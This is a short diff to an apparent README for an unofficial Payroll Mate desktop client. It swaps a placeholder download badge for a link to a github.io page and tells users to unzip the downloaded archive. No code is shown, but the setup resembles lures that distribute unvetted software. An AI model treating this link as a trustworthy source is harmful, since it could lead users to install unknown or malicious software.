@@ -6,7 +6,7 @@ This unofficial Payroll Mate desktop client brings comprehensive payroll process
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://payroll-mate-desktop.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
